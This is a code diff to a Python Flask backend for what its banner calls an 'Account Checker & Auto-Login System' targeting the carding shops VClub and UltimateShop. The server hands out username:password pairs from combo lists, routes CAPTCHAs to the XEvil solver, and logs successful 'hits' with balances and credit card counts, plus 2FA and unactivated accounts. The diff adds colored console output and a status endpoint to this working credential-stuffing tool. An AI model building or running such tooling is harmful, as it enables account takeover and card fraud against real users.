@@ -6,6 +6,11 @@ import base64
 import logging
 import time
 import re
+import colorama
+from colorama import Fore, Back, Style
+
+# Initialize colorama for cross-platform colored output
+colorama.init(autoreset=True)
 
 # Setup logging
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -20,18 +25,79 @@ if not os.path.exists(HIT_FOLDER):
 app = Flask(__name__)
 CORS(app)
 
+# ASCII Banner
+def print_banner():
+    banner = f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║  {Fore.YELLOW}██╗   ██╗██╗      ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██████╗{Fore.CYAN}      ║
+║  {Fore.YELLOW}██║   ██║██║     ██╔════╝ ██║     ██╔════╝██╔═══██╗██╔══██╗██╔══██╗{Fore.CYAN}     ║
+║  {Fore.YELLOW}██║   ██║██║     ██║  ███╗██║     ██║     ██║   ██║███████║██████╔╝{Fore.CYAN}     ║
+║  {Fore.YELLOW}╚██╗ ██╔╝██║     ██║   ██║██║     ██║     ██║   ██║██╔══██║██╔══██╗{Fore.CYAN}     ║
+║   {Fore.YELLOW}╚████╔╝ ███████╗╚██████╔╝███████╗╚██████╗╚██████╔╝██║  ██║██║  ██║{Fore.CYAN}     ║
+║    {Fore.YELLOW}╚═══╝  ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.CYAN}     ║
+║                                                                              ║
+║  {Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════╗{Fore.CYAN}  ║
+║  {Fore.GREEN}║                    ACCOUNT CHECKER & AUTO-LOGIN SYSTEM                ║{Fore.CYAN}  ║
+║  {Fore.GREEN}║                         Powered by Flask + XEvil                      ║{Fore.CYAN}  ║
+║  {Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════╝{Fore.CYAN}  ║
+║                                                                              ║
+║  {Fore.MAGENTA}Features:{Fore.CYAN}                                                                      ║
+║  {Fore.MAGENTA}•{Fore.WHITE} Automated account checking with human-like behavior                    ║
+║  {Fore.MAGENTA}•{Fore.WHITE} CAPTCHA solving via XEvil integration                               ║
+║  {Fore.MAGENTA}•{Fore.WHITE} Real-time result reporting and logging                               ║
+║  {Fore.MAGENTA}•{Fore.WHITE} Multi-site support (VClub, UltimateShop, etc.)                       ║
+║  {Fore.MAGENTA}•{Fore.WHITE} Intelligent error handling and recovery                              ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+    print(banner)
+
+def print_status(message, status_type="info"):
+    colors = {
+        "info": Fore.CYAN,
+        "success": Fore.GREEN,
+        "warning": Fore.YELLOW,
+        "error": Fore.RED,
+        "highlight": Fore.MAGENTA
+    }
+    color = colors.get(status_type, Fore.WHITE)
+    timestamp = time.strftime("%H:%M:%S")
+    print(f"{Fore.BLUE}[{timestamp}]{color} {message}{Style.RESET_ALL}")
+
+def print_separator():
+    print(f"{Fore.CYAN}{'═' * 80}{Style.RESET_ALL}")
+
 # Load accounts file
-filename = input("Enter your list file (with extension, e.g., accounts.txt): ")
-accounts_path = os.path.join(script_dir, filename)
-if not os.path.exists(accounts_path):
-    if not filename.endswith('.txt'):
-        accounts_path = os.path.join(script_dir, filename + '.txt')
-        if not os.path.exists(accounts_path):
-            logger.error('File not found: %s', accounts_path)
-            print('File not found, exiting...')
-            os.system('pause')
-            exit()
-ACCOUNTS_FILE = accounts_path
+def load_accounts_interactive():
+    print_separator()
+    print_status("🔍 ACCOUNT LOADING INTERFACE", "highlight")
+    print_separator()
+    
+    while True:
+        filename = input(f"{Fore.YELLOW}📁 Enter your accounts file name (e.g., accounts.txt): {Style.RESET_ALL}").strip()
+        
+        if not filename:
+            print_status("❌ Please enter a filename", "error")
+            continue
+            
+        # Add .txt extension if not provided
+        if not filename.endswith('.txt'):
+            filename += '.txt'
+            
+        accounts_path = os.path.join(script_dir, filename)
+        
+        if os.path.exists(accounts_path):
+            print_status(f"✅ Found accounts file: {filename}", "success")
+            return accounts_path
+        else:
+            print_status(f"❌ File not found: {filename}", "error")
+            retry = input(f"{Fore.YELLOW}Try again? (y/n): {Style.RESET_ALL}").lower()
+            if retry != 'y':
+                print_status("Exiting...", "error")
+                exit(1)
+
+ACCOUNTS_FILE = load_accounts_interactive()
 
 def load_accounts():
     if not os.path.exists(ACCOUNTS_FILE):
@@ -65,7 +131,7 @@ def load_accounts():
                     continue
                 
                 if number_pattern.match(password.strip()):
-                    logger.warning('Skipping number-only password at line %d: %s', line_number, line)
+                    logger.warning('Skipping number-only password at line %d: %s', line_number, password)
                     continue
                 
                 accounts.append({"username": username, "password": password})
@@ -87,15 +153,23 @@ def save_accounts(accounts):
 
 accounts = load_accounts()
 
+# Print initial stats
+print_separator()
+print_status(f"📊 LOADED {len(accounts)} VALID ACCOUNTS", "success")
+print_status(f"📁 File: {os.path.basename(ACCOUNTS_FILE)}", "info")
+print_status(f"🌐 Server will start on: http://localhost:5050", "info")
+print_separator()
+
 @app.route("/get-creds", methods=["GET"])
 def get_creds():
     global accounts
     if accounts:
         acc = accounts.pop(0)
         save_accounts(accounts)
-        logger.info('Provided credentials: %s', acc['username'])
+        remaining = len(accounts)
+        print_status(f"🔑 Provided credentials: {acc['username']} | Remaining: {remaining}", "success")
         return jsonify(acc)
-    logger.warning('No credentials available')
+    print_status("⚠️ No credentials available", "warning")
     return jsonify({"error": "No credentials left"}), 404
 
 @app.route("/solve-captcha", methods=["POST"])
@@ -187,6 +261,7 @@ def report_2fa():
     hit_file = os.path.join(HIT_FOLDER, "2fa-hit.txt")
     with open(hit_file, "a") as f:
         f.write(f"{username}:{password}\n")
+    print_status(f"🔐 2FA Account: {username}", "warning")
     logger.info('Logged 2FA hit: %s', username)
     return jsonify({"status": "success"})
 
@@ -200,6 +275,7 @@ def report_unactivated():
     free_file = os.path.join(HIT_FOLDER, "free.txt")
     with open(free_file, "a") as f:
         f.write(f"{username}:{password}\n")
+    print_status(f"🆓 Unactivated Account: {username}", "warning")
     logger.info('Logged unactivated account: %s', username)
     return jsonify({"status": "success"})
 
@@ -217,9 +293,32 @@ def report_hit():
     hit_file = os.path.join(HIT_FOLDER, "hit.txt")
     with open(hit_file, "a") as f:
         f.write(f"{username}:{password} Balance: {balance} $, Total CCS {totalCCS}, Amounts {amounts}$, Refunds {refunds}\n")
+    print_status(f"💰 HIT! Account: {username} | Balance: ${balance}", "success")
     logger.info('Logged hit: %s', username)
     return jsonify({"status": "success"})
 
+@app.route("/status", methods=["GET"])
+def get_status():
+    return jsonify({
+        "status": "running",
+        "accounts_remaining": len(accounts),
+        "total_loaded": len(accounts) + (1000000 - len(accounts) if len(accounts) < 1000000 else 0),
+        "server_time": time.strftime("%Y-%m-%d %H:%M:%S")
+    })
+
 if __name__ == "__main__":
-    logger.info("Starting server for VClub login automation...")
-    app.run(host="0.0.0.0", port=5050, debug=False)
+    print_banner()
+    print_status("🚀 Starting UltimateShop/VClub Auto-Login Server...", "highlight")
+    print_status("⚡ Server is starting up...", "info")
+    print_status("🔧 Press Ctrl+C to stop the server", "warning")
+    print_separator()
+    
+    try:
+        app.run(host="0.0.0.0", port=5050, debug=False)
+    except KeyboardInterrupt:
+        print_separator()
+        print_status("🛑 Server stopped by user", "error")
+        print_status("👋 Goodbye!", "highlight")
+    except Exception as e:
+        print_status(f"❌ Error starting server: {e}", "error")
+        print_status("Please check the error message above and try again", "warning")
